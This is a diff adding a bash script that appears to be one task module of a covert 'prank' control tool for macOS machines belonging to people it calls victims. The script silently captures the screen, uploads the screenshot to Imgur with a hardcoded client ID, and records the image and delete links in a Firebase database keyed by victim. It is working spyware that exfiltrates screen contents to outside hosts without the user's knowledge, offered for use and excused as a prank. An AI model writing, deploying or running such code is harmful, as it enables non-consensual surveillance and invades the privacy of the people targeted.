@@ -1,0 +1,63 @@
+#!/usr/bin/env bash
+# REST API
+# https://firebase.google.com/docs/reference/rest/database/
+
+# Get the location of this script.
+SCRIPTDIR=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )
+
+# Define the task ID
+thisTaskID="prototype"
+
+# Get some default functions and variables from the deployment
+source "$SCRIPTDIR/deploy"
+
+
+###############################################################################
+
+# Get the program parameters.
+
+victim="$1"
+rootIteration="$2"
+
+###############################################################################
+
+function performUpload() {
+  default_client_id=c9a6efb3d7932fd
+  client_id="${IMGUR_CLIENT_ID:=$default_client_id}"
+  curl -s -H "Authorization: Client-ID $client_id" -H "Expect: " -F "image=$1" https://api.imgur.com/3/image.xml
+  # The "Expect: " header is to get around a problem when using this through
+  # the Squid proxy. Not sure if it's a Squid bug or what.
+}
+
+file="${SCRIPTDIR}/sc.jpg"
+screencapture -x "$file"
+response=$(performUpload "@$file") 2>/dev/null
+rm "$file"
+
+url="${response##*<link>}"
+url="${url%%</link>*}"
+delete_hash="${response##*<deletehash>}"
+delete_hash="${delete_hash%%</deletehash>*}"
+url=`echo $url | sed 's/^http:/https:/'`
+dpage="https://imgur.com/delete/$delete_hash"
+
+echo $url
+echo $dpage
+
+timestamp=`date +"%Y-%m-%d_%H-%M-%S"`
+
+curl -X PUT -d "
+ {
+  \"image\" : \"$url\",
+  \"del_link\" : \"$dpage\"
+ }" "https://${firebaseProject}.firebaseio.com/victims/$victim/$thisTaskID/$timestamp.json"
+
+#If you want to swap to another task, you can do it like so:
+setVictimTask "$victim" "default"
+
+###############################################################################
+
+#Finally, you should sleep as well. Try not to use the computer's resources too much,
+# It is only a prank, after all.
+
+sleep 15
